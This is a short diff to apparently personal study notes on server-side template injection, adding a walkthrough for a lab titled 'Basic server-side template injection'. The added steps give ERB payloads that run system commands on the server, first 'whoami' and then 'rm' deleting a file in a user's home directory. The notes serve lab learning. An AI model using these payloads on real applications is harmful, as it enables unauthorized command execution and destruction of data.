@@ -92,15 +92,13 @@ Razor (.Net):
 
 
 
-
-
-
-
-
-
-
-
+--------------------------------------------------------------------
 
 #1 Lab: Basic server-side template injection
 
-    1.
+    1.check where website is sending response 
+    2.try by using basic payloads such as <%= system("whoami") %> ,it'll reflect the name of user running the web server
+    3. then inject with <%= system("rm /home/carlos/morale.txt") %>
+
+
+--------------------------------------------------------------------------------------------------------------------------
